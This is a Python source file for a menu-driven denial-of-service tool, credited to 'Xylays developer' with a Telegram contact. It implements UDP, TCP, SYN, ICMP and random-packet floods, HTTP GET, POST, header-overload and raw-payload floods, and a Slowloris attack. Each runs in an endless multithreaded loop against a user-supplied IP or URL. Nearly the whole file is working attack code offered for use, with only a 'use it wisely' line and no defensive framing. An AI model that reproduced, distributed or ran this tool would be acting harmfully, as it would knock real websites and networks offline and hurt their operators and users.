import threading
import socket
import random
import time
import sys
import requests
import os

# ------------------------
# Basic Usage
# ------------------------

def usage():
    print("""
╭━━━┳╮╱╱╭┳╮╱╱╭┳━━━┳━━━╮
┃╭━╮┃╰╮╭╯┃╰╮╭╯┃╭━╮┃╭━╮┃
┃╰━╯┣╮╰╯╭┻╮╰╯╭┻╯╭╯┣╯╭╯┃
┃╭╮╭╯╰╮╭╯╱╰╮╭╯╱╱┃╭╯╱┃╭╯
┃┃┃╰╮╱┃┃╱╱╱┃┃╱╱╱┃┃╱╱┃┃╱
╰╯╰━╯╱╰╯╱╱╱╰╯╱╱╱╰╯╱╱╰╯╱
╭━━━┳━━┳━━━┳━━━━┳━━━┳━━━╮
╰╮╭╮┣┫┣┻╮╭╮┃╭╮╭╮┃╭━╮┃╭━╮┃
╱┃┃┃┃┃┃╱┃┃┃┃╭━━╮┃╰━━┫╰━━╮
╱┃┃┃┃┃┃╱┃┃┃┃┃┃┃┃┣━━╮┣━━╮┃
╭╯╰╯┣┫┣┳╯╰╯┃╰━━╯┃╰━╯┃╰━╯┃
╰━━━┻━━┻━━━┻━━━━┻━━━┻━━━╯
╔══╦╗╔╦═╗
╚╗╔╣╚╝║╦╝
─║║║╔╗║╩╗
─╚╝╚╝╚╩═╝
╔═╦═╦╦═╦╦═╦═╦══╦╗╔╦╗╔╗─
║╬║║║║║║║╦╣╬║═╦╣║║║║║║─
║╔╣║║║║║║╩╣╗╣╔╝║╚╝║╚╣╚╗
╚╝╚═╩═╩═╩═╩╩╩╝─╚══╩═╩═╝
╔══╦══╦═╦══╗
╚╗╗╠╗╗║║║══╣
╔╩╝╠╩╝║║╠══║
╚══╩══╩═╩══╝
╔══╦══╦══╦══╦═╦╦╦══╦═╦╗
║╔╗╠╗╔╩╗╔╣╔╗║╔╣╔╩║║╣║║║
║╠╣║║║─║║║╠╣║╚╣╚╦║║╣║║║
╚╝╚╝╚╝─╚╝╚╝╚╩═╩╩╩══╩╩═╝
╔══╗
║╔═╣
║╚╗║
╚══╝
© Xylays developer
Contact: t.me/conquerryy
please use it wisely!

  DISPLAY ATTACK:
    [1] UDP Flood
    [2] TCP Flood
    [3] HTTP GET Flood
    [4] TCP SYN Flood
    [5] HTTP POST Flood
    [6] Slowloris Attack
    [7] ICMP Ping Flood
    [8] Random Packet Flood
    [9] HTTP Header Overload
    [10] HTTP RAW Payload Attack
    [11] Check IP Address
    """)

# -----------------------------
# Attack Functions
# -----------------------------

def udp_flood(ip, port, packets):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            data = random._urandom(1024)
            for _ in range(packets):
                sock.sendto(data, addr)
            print(f"[UDP] Attacking {ip}:{port}")
        except:
            pass

def tcp_flood(ip, port, packets):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            data = random._urandom(1024)
            for _ in range(packets):
                sock.send(data)
            print(f"[TCP] Attacking {ip}:{port}")
            sock.close()
        except:
            pass

def http_get_flood(url, packets):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Connection": "keep-alive"
    }
    while True:
        try:
            for _ in range(packets):
                r = requests.get(url, headers=headers)
                print(f"[HTTP-GET] {url} Status: {r.status_code}")
        except:
            pass

def syn_flood(ip, port, packets):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            data = random._urandom(1024)
            addr = (ip, port)
            for _ in range(packets):
                sock.sendto(data, addr)
            print(f"[SYN] Flooding {ip}:{port}")
        except:
            pass

def http_post_flood(url, packets):
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = "param=" + "A" * 1000
    while True:
        try:
            for _ in range(packets):
                r = requests.post(url, headers=headers, data=payload)
                print(f"[HTTP-POST] {url} Status: {r.status_code}")
        except:
            pass

def slowloris_attack(ip, port):
    sockets = []
    try:
        for _ in range(200):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1000)).encode('utf-8'))
            sockets.append(s)
        while True:
            for s in sockets:
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode('utf-8'))
                except:
                    sockets.remove(s)
                    s.close()
            print(f"[Slowloris] Holding {len(sockets)} connections.")
            time.sleep(15)
    except:
        pass

def icmp_flood(ip, packets):
    while True:
        try:
            for _ in range(packets):
                os.system(f"ping {ip} -l 65500 -n 1")
            print(f"[ICMP] Ping flood {ip}")
        except:
            pass

def random_flood(ip, port, packets):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(4096)
            addr = (str(ip), int(port))
            for _ in range(packets):
                sock.sendto(data, addr)
            print(f"[RANDOM] Flooding {ip}:{port}")
        except:
            pass

def header_overload(url, packets):
    while True:
        try:
            headers = {f"X-Custom-{i}": "A"*1000 for i in range(100)}
            for _ in range(packets):
                r = requests.get(url, headers=headers)
                print(f"[HeaderOverload] {url} Status: {r.status_code}")
        except:
            pass

def raw_payload_attack(url, packets):
    payload = random._urandom(5000)
    headers = {
        "Content-Type": "application/octet-stream",
        "User-Agent": "Custom-Raw-Attack"
    }
    while True:
        try:
            for _ in range(packets):
                r = requests.post(url, data=payload, headers=headers)
                print(f"[RAW-Payload] {url} Status: {r.status_code}")
        except:
            pass

# ------------------------
# Check IP Function
# ------------------------

def check_ip(domain):
    try:
        ip = socket.gethostbyname(domain)
        print(f"Domain {domain} resolved to IP: {ip}")
    except Exception as e:
        print(f"Error resolving domain: {e}")

# ------------------------
# Main Menu
# ------------------------

if __name__ == "__main__":
    usage()
    choice = input("Select an option (1-11): ")

    if choice == '1':
        ip = input("Target IP: ")
        port = int(input("Target Port: "))
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            th = threading.Thread(target=udp_flood, args=(ip, port, packets))
            th.start()

    elif choice == '2':
        ip = input("Target IP: ")
        port = int(input("Target Port: "))
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            th = threading.Thread(target=tcp_flood, args=(ip, port, packets))
            th.start()

    elif choice == '3':
        url = input("Target URL (with http/https): ")
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            th = threading.Thread(target=http_get_flood, args=(url, packets))
            th.start()

    elif choice == '4':
        ip = input("Target IP: ")
        port = int(input("Target Port: "))
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            th = threading.Thread(target=syn_flood, args=(ip, port, packets))
            th.start()

    elif choice == '5':
        url = input("Target URL (with http/https): ")
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            th = threading.Thread(target=http_post_flood, args=(url, packets))
            th.start()

    elif choice == '6':
        ip = input("Target IP: ")
        port = int(input("Target Port: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            th = threading.Thread(target=slowloris_attack, args=(ip, port))
            th.start()

    elif choice == '7':
        ip = input("Target IP: ")
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            th = threading.Thread(target=icmp_flood, args=(ip, packets))
            th.start()

    elif choice == '8':
        ip = input("Target IP: ")
        port = int(input("Target Port: "))
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            th = threading.Thread(target=random_flood, args=(ip, port, packets))
            th.start()

    elif choice == '9':
        url = input("Target URL (with http/https): ")
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            th = threading.Thread(target=header_overload, args=(url, packets))
            th.start()

    elif choice == '10':
        url = input("Target URL (with http/https): ")
        packets = int(input("Packets per thread: "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            th = threading.Thread(target=raw_payload_attack, args=(url, packets))
            th.start()

    elif choice == '11':
        domain = input("Enter domain (without http/https): ")
        check_ip(domain)

    else:
        print("Invalid option.")